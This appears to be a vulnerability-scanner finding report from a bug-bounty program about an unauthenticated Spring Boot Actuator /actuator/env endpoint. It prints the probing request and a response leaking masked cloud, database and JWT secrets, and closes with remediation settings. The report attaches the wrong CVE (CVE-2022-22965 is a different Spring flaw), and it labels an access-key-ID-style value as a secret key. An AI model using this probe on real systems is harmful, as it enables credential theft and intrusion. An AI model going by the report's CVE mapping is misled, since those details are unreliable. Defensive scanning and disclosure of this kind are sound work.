CRITICAL

Spring Boot Actuator Environment Exposure

Template: spring-actuator-env • CVE-2022-22965 • Job: job-9042a-sync
Matched Target URI https://api.shop-partner.test/actuator/env
Program & Scope shopify-vdp (In-Scope Web Tier)
Detection Matcher word: activeProfiles || propertySources
Timestamp Discovered 12 Oct 2026 14:22:04 UTC (12m ago)

Vulnerability Synopsis

The Spring Boot Actuator endpoint /actuator/env is openly accessible without authentication. This endpoint dumps the entire execution environment, including operating system system variables, AWS/GCP service account credentials, database connection strings, and active microservice profiles. An attacker can leverage exposed API tokens or override dynamic logging configurations to pivot towards Remote Code Execution.

Proof of Concept Telemetry

# Request:
GET /actuator/env HTTP/1.1
Host: api.shop-partner.test
User-Agent: Nuclei/v3.2.1 (Security Scanner; ReconOS)
Accept: application/json
Connection: close
# Response (HTTP 200 OK):
{
  "activeProfiles": ["production", "aws-us-east-1"],
  "propertySources": [
    {
      "name": "systemEnvironment",
      "properties": {
        "SPRING_DATASOURCE_URL": {"value": "jdbc:postgresql://db-internal:5432/core"},
        "AWS_SECRET_ACCESS_KEY": {"value": "AKIA49******EXPOSED"},
        "JWT_SECRET_SIGNING_KEY": {"value": "dGhpcy1pcy1hLXNlY3JldA=="}
      }
    }
  ]
}

security Remediation Guidance

Restrict actuator endpoints via Spring Security configuration: Set management.endpoints.web.exposure.include=health,info in application.properties or apply zero-trust gateway routing rules to drop public requests to /actuator/**.
